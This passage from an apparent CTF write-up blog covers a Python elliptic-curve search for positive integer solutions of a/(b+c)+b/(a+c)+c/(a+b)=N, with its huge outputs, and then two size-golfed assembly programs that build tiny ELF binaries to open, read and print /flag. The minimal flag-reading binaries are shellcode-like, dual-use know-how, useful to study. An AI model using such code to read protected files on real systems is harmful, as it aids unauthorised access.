class="number">2</span>)*x)/((<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">assert</span> equ(a,b,c)== N</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span> <span class="keyword">and</span> c &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#print(a,b,c)</span></span><br><span class="line">        da,db,dc = a.denominator,b.denominator,c.denominator</span><br><span class="line">        lcm = lcm_3(da,db,dc)</span><br><span class="line">        <span class="comment">#print(lcm)</span></span><br><span class="line">        lcm = Fraction(<span class="built_in">int</span>(lcm),<span class="number">1</span>)</span><br><span class="line">        aa,bb,cc = a.numerator*lcm//a.denominator,b.numerator*lcm//b.denominator,c.numerator*lcm//c.denominator</span><br><span class="line">        <span class="keyword">if</span> log(aa,<span class="number">10</span>) &gt;<span class="number">4096</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;aa&#125;</span>\nb=<span class="subst">&#123;bb&#125;</span>\nc=<span class="subst">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(equ(aa,bb,cc))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment">#print(a/(b+c)+b/(a+c)+c/(a+b),N)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ff</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + aa*x + bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">xp,yp,xq,yq</span>):</span><br><span class="line">    <span class="comment">#xp += a/3</span></span><br><span class="line">    <span class="comment">#xq += a/3</span></span><br><span class="line">    <span class="comment">#print(yp**2,ff(xp))</span></span><br><span class="line">    <span class="keyword">if</span> xp == xq <span class="keyword">and</span> yq == yp:</span><br><span class="line">        lm = (<span class="number">3</span>*xp**<span class="number">2</span>+aa)/(<span class="number">2</span>*yp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lm = (yp-yq)/(xp-xq)</span><br><span class="line">    xr = lm**<span class="number">2</span>-xp-xq</span><br><span class="line">    yr = lm*(xp-xr)-yp</span><br><span class="line">    <span class="comment">#print(yr**2,ff(xr),f(xr-a/3))</span></span><br><span class="line">    <span class="comment">#print(type(xr))</span></span><br><span class="line">    <span class="keyword">return</span> xr,yr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + a*x**<span class="number">2</span>+b*x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">x,y</span>):</span><br><span class="line">    x = Fraction(<span class="built_in">int</span>(x),<span class="number">1</span>)</span><br><span class="line">    y = Fraction(<span class="built_in">int</span>(y),<span class="number">1</span>)</span><br><span class="line">    x += a/<span class="number">3</span></span><br><span class="line">    <span class="comment">#print(check(geta(x,y),getb(x,y),getc(x,y)))</span></span><br><span class="line">    xr,yr = add(x,y,x,y)</span><br><span class="line">    check(geta(xr-a/<span class="number">3</span>,yr),getb(xr-a/<span class="number">3</span>,yr),getc(xr-a/<span class="number">3</span>,yr))</span><br><span class="line">    <span class="comment">#print(xr-a/3,yr)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        xrr,yrr = add(x,y,xr,yr)</span><br><span class="line">        <span class="keyword">if</span> check(geta(xrr-a/<span class="number">3</span>,yrr),getb(xrr-a/<span class="number">3</span>,yrr),getc(xrr-a/<span class="number">3</span>,yrr)):</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment">#x,y = xr,yr</span></span><br><span class="line">        xr,yr = xrr,yrr</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">20000</span>,<span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fx = f(x)</span><br><span class="line">    <span class="keyword">if</span> fx &lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    y,flag = gmpy2.iroot(<span class="built_in">int</span>(fx),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#solve(x,y)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> solve(x,y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">N=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-100 260</span><br><span class="line">N=4</span><br><span class="line">a=154476802108746166441951315019919837485664325669565431700026634898253202035277999</span><br><span class="line">b=36875131794129999827197811565225474825492979968971970996283137471637224634055579</span><br><span class="line">c=4373612677928697257861252602371390152816537558161613618621437993378423467772036</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-200 680</span><br><span class="line">N=6</span><br><span class="line">a=20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span><br><span class="line">b=2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span><br><span class="line">c=1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 10</span><br><span class="line">a=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span><br><span class="line">b=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span><br><span class="line">c=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 12</span><br><span class="line">a=9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825589841391881179369502441</span><br><span class="line">b=355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361</span><br><span class="line">c=20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N=14</span><br><span class="line">a=87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span><br><span class="line">b=1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br><span class="line">c=35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span><br></pre></td></tr></table></figure>




<h3 id="Tiny-ELF"><a href="#Tiny-ELF" class="headerlink" title="Tiny ELF"></a>Tiny ELF</h3><p>手写汇编 3个syscall 不过似乎32bit比64bit更剩空间一点<br><a target="_blank" rel="noopener" href="https://www.ngui.cc/el/639055.html?action=onClick">https://www.ngui.cc/el/639055.html?action=onClick</a><br>应该是下面这个 记不清了（下面有80bytes的版本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.section .bss</span><br><span class="line">.equ bufSIZE, 65535</span><br><span class="line">.comm buf, bufSIZE</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.LC0:</span><br><span class="line">	.string &quot;/flag&quot;</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:	movl $2,%eax</span><br><span class="line">	leaq	.LC0(%rip),%rdi</span><br><span class="line">	//movq	$0,%rsi</span><br><span class="line">	syscall</span><br><span class="line">	mov 	%eax,%edi</span><br><span class="line">	leaq	-80(%rsp),%rsi</span><br><span class="line">	mov 	$32,%dx</span><br><span class="line">	xor 	%eax,%eax</span><br><span class="line">	syscall</span><br><span class="line">	movq    $1,%rdi</span><br><span class="line">	mov 	$1,%rax</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">mov $0x3c, %eax</span><br><span class="line">mov $42, %edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<h3 id="Teensy-ELF"><a href="#Teensy-ELF" class="headerlink" title="Teensy ELF"></a>Teensy ELF</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html">https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html</a><br>不太懂具体原因 详细看elf文件格式可能得花很多时间 这里直接参考文章作者修改版和原版的对比尝试构造<br>一些可以优化的地方：</p>
<ul>
<li>fd的0 1 2分别对应stdin stdout stderr 所以新开的文件fd一定是3 write的系统调用号也是3 省去一次赋值</li>
<li>open不需要第三个参数 可以提前把write的第三个参数值传好</li>
<li>寄存器默认是0 都不用设置</li>
<li>mov常数占用字节太多 用xor清空加inc dec等指令</li>
</ul>
<p>最后正好80bytes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">;nasm -f bin -o tiny4.out tiny4.asm</span><br><span class="line">  BITS 32</span><br><span class="line"></span><br><span class="line">	        org     0x00010000</span><br><span class="line"></span><br><span class="line">	        db      0x7F, &quot;ELF&quot;             ; e_ident</span><br><span class="line">	        dd      1                                       ; p_type</span><br><span class="line">	        dd      0                                       ; p_offset</span><br><span class="line">	        dd      $$                                      ; p_vaddr</span><br><span class="line">	        dw      2                       ; e_type        ; p_paddr</span><br><span class="line">	        dw      3                       ; e_machine</span><br><span class="line">	        dd      _start                  ; e_version     ; p_filesz</span><br><span class="line">	        dd      _start                  ; e_entry       ; p_memsz</span><br><span class="line">	        dd      4                       ; e_phoff       ; p_flags</span><br><span class="line"></span><br><span class="line">  _start:</span><br><span class="line">	        mov ebx,esp</span><br><span class="line">            mov dl,0x20</span><br><span class="line">            ; xor     eax,eax</span><br><span class="line">	        ; xor     ecx,ecx   ; str len       ; e_flags</span><br><span class="line">	        mov     al, 5   ; sys_write(fd, addr, len) : ebx, ecx, edx</span><br><span class="line">	        jmp     _next   ; jump to next part of the code</span><br><span class="line">	        dw      0x33                      ; e_ehsize</span><br><span class="line">	        dw      0x20                      ; e_phentsize</span><br><span class="line">	        dw      1                         ; e_phnum</span><br><span class="line">  _next:        </span><br><span class="line">            mov [esp],DWORD &#x27;/fla&#x27;</span><br><span class="line">            mov [esp+4], WORD 0x0067</span><br><span class="line">            int     0x80    ; syscall         ; e_shentsize</span><br><span class="line">            mov ebx,eax</span><br><span class="line">            mov ecx,esp</span><br><span class="line">            ; mov edx,0x20</span><br><span class="line">			int 0x80</span><br><span class="line">			mov     al, 4</span><br><span class="line">            dec ebx</span><br><span class="line">            dec ebx</span><br><span class="line">			int 0x80</span><br><span class="line"></span><br><span class="line">            mov bl,42</span><br><span class="line">	        mov     al, 1   ; eax=1,sys_exit  ; e_shnum</span><br><span class="line">	        int     0x80    ; syscall         ; e_shstrndx</span><br><span class="line"></span><br><span class="line">  filesize      equ     $ - $$</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/01/22/misc/react-native-note/" rel="prev" title="react-native 开发记录">
                  <i class="fa fa-angle-left"></i> react-native 开发记录
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/01/22/virtualization/balloon/" rel="next" title="balloon">
                  balloon <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">szy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">34k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">2:04</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
